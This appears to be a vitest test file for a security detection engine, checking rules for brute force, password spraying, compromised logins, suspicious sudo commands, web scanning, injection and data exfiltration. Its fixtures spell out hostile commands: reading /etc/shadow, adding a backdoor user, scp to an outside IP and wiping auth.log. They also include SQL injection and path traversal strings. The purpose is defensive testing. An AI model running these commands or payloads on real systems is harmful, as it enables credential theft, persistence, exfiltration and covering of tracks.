import { describe, it, expect } from 'vitest';
import { bruteForce, passwordSpray, compromisedLogin, unusualLogin } from '../src/detectors/auth.js';
import { suspiciousCommands } from '../src/detectors/commands.js';
import { recon, webAttack, exfiltration } from '../src/detectors/web.js';
import { DEFAULT_CONFIG as C } from '../src/detectors/config.js';

const T0 = Date.UTC(2026, 9, 3, 2, 0, 0);
let seq = 0;
const ev = (sec, fields) => ({ seq: seq++, ts: new Date(T0 + sec * 1000), source: 'auth', ip: null, user: null, outcome: null, ...fields });
const fail = (sec, ip, user, source = 'auth') => ev(sec, { action: 'login', outcome: 'failure', ip, user, source });
const ok = (sec, ip, user, source = 'auth') => ev(sec, { action: 'login', outcome: 'success', ip, user, source });
const http = (sec, ip, path, status = 200, bytes = 2000) => ev(sec, { source: 'web', action: 'http', ip, path, status, bytes, method: 'GET' });

describe('brute force', () => {
  it('fires on 10+ failures inside 5 minutes', () => {
    const evs = Array.from({ length: 12 }, (_, i) => fail(i * 10, '1.2.3.4', 'root'));
    const alerts = bruteForce(evs, C.bruteForce);
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toMatchObject({ entity: '1.2.3.4', severity: 'high' });
    expect(alerts[0].evidence).toHaveLength(12);
  });

  it('ignores low-and-slow failures spread over hours', () => {
    const evs = Array.from({ length: 12 }, (_, i) => fail(i * 900, '1.2.3.4', 'root'));
    expect(bruteForce(evs, C.bruteForce)).toHaveLength(0);
  });

  it('ignores a user mistyping their password a couple of times', () => {
    const evs = [fail(0, '10.0.0.1', 'alice'), fail(5, '10.0.0.1', 'alice'), ok(10, '10.0.0.1', 'alice')];
    expect(bruteForce(evs, C.bruteForce)).toHaveLength(0);
    expect(compromisedLogin(evs, C.compromise)).toHaveLength(0);
  });
});

describe('password spray', () => {
  it('fires when one ip tries 5+ usernames', () => {
    const evs = ['a', 'b', 'c', 'd', 'e'].map((u, i) => fail(i * 30, '5.5.5.5', u));
    expect(passwordSpray(evs, C.spray)[0]).toMatchObject({ rule: 'password_spray', entity: '5.5.5.5' });
  });
  it('does not fire for a single username', () => {
    const evs = Array.from({ length: 8 }, (_, i) => fail(i * 30, '5.5.5.5', 'root'));
    expect(passwordSpray(evs, C.spray)).toHaveLength(0);
  });
});

describe('compromised login', () => {
  it('flags a success right after a run of failures', () => {
    const evs = [...Array.from({ length: 6 }, (_, i) => fail(i * 20, '6.6.6.6', 'deploy')), ok(200, '6.6.6.6', 'deploy')];
    const [a] = compromisedLogin(evs, C.compromise);
    expect(a).toMatchObject({ severity: 'critical', entity: 'deploy', meta: { ip: '6.6.6.6' } });
    // timestamp of the alert is the successful login
    expect(a.firstSeen).toEqual(evs[6].ts);
  });

  it('does not blame ssh failures for a web login when web has its own failures', () => {
    const evs = [
      ...Array.from({ length: 20 }, (_, i) => fail(i * 5, '6.6.6.6', 'root', 'auth')),
      ...Array.from({ length: 6 }, (_, i) => fail(200 + i * 5, '6.6.6.6', null, 'web')),
      ok(300, '6.6.6.6', 'mike', 'web'),
    ];
    const [a] = compromisedLogin(evs, C.compromise);
    expect(a.meta.priorFailures).toBe(6);
  });
});

describe('unusual login', () => {
  it('flags first login from a new ip once there is a baseline', () => {
    const evs = [ok(0, '10.0.0.5', 'bob'), ok(3600, '10.0.0.5', 'bob'), ok(7200, '10.0.0.5', 'bob'), ok(7300, '9.9.9.9', 'bob')];
    const alerts = unusualLogin(evs, C.unusualLogin);
    expect(alerts).toHaveLength(1);
    expect(alerts[0].meta.ip).toBe('9.9.9.9');
  });
  it('stays quiet without enough history', () => {
    const evs = [ok(0, '10.0.0.5', 'bob'), ok(60, '9.9.9.9', 'bob')];
    expect(unusualLogin(evs, C.unusualLogin)).toHaveLength(0);
  });
});

describe('suspicious commands', () => {
  const sudo = (sec, user, cmd, outcome = 'success') => ev(sec, { action: 'sudo', user, outcome, detail: `as root: ${cmd}` });

  it('classifies commands into kill chain stages', () => {
    const evs = [
      sudo(0, 'deploy', '/bin/cat /etc/shadow'),
      sudo(30, 'deploy', '/usr/sbin/useradd -m backdoor'),
      sudo(60, 'deploy', '/usr/bin/scp /tmp/x.tgz me@1.2.3.4:/'),
      sudo(90, 'deploy', '/usr/bin/truncate -s 0 /var/log/auth.log'),
    ];
    const stages = suspiciousCommands(evs, C.commands).map((a) => a.stage).sort();
    expect(stages).toEqual(['Defense Evasion', 'Exfiltration', 'Persistence', 'Privilege Escalation']);
  });

  it('does not flag routine admin commands', () => {
    const evs = [sudo(0, 'devops', '/usr/bin/systemctl restart nginx'), sudo(10, 'devops', '/usr/bin/apt update'), sudo(20, 'devops', '/usr/bin/tail -n 200 /var/log/nginx/error.log')];
    expect(suspiciousCommands(evs, C.commands)).toHaveLength(0);
  });

  it('reports denied sudo attempts', () => {
    const [a] = suspiciousCommands([sudo(0, 'guest', '/bin/bash', 'failure')], C.commands);
    expect(a.rule).toBe('sudo_denied');
  });
});

describe('web rules', () => {
  it('detects scanning by probe paths', () => {
    const evs = ['/.env', '/.git/config', '/wp-admin/', '/phpmyadmin/'].map((p, i) => http(i, '7.7.7.7', p, 404, 150));
    expect(recon(evs, C.recon)[0]).toMatchObject({ rule: 'recon_scan', entity: '7.7.7.7' });
  });

  it('a few normal 404s are not a scan', () => {
    const evs = [http(0, '8.8.8.8', '/favicon.ico', 404), http(5, '8.8.8.8', '/old-page', 404), http(9, '8.8.8.8', '/', 200)];
    expect(recon(evs, C.recon)).toHaveLength(0);
  });

  it('detects injection payloads and marks ones that got a 200', () => {
    const evs = [http(0, '7.7.7.7', "/p?id=1' OR '1'='1", 500), http(5, '7.7.7.7', '/p?id=1 UNION SELECT a,b FROM users--', 200), http(9, '7.7.7.7', '/f?x=../../etc/passwd', 404)];
    const [a] = webAttack(evs, C.webAttack);
    expect(a.severity).toBe('high');
    expect(a.meta.kinds).toEqual(expect.arrayContaining(['SQL injection', 'Path traversal']));
  });

  it('normal query strings are not payloads', () => {
    const evs = [http(0, '1.1.1.1', '/search?q=red shoes&page=2'), http(1, '1.1.1.1', '/api/orders?status=open')];
    expect(webAttack(evs, C.webAttack)).toHaveLength(0);
  });

  it('flags responses far above the typical size', () => {
    const normal = Array.from({ length: 50 }, (_, i) => http(i, `10.0.0.${i}`, '/x', 200, 20_000));
    const big = [http(100, '7.7.7.7', '/api/export?t=a', 200, 60e6), http(160, '7.7.7.7', '/api/export?t=b', 200, 70e6)];
    const [a] = exfiltration([...normal, ...big], C.exfil);
    expect(a).toMatchObject({ entity: '7.7.7.7', severity: 'critical' });
    expect(exfiltration(normal, C.exfil)).toHaveLength(0);
  });
});
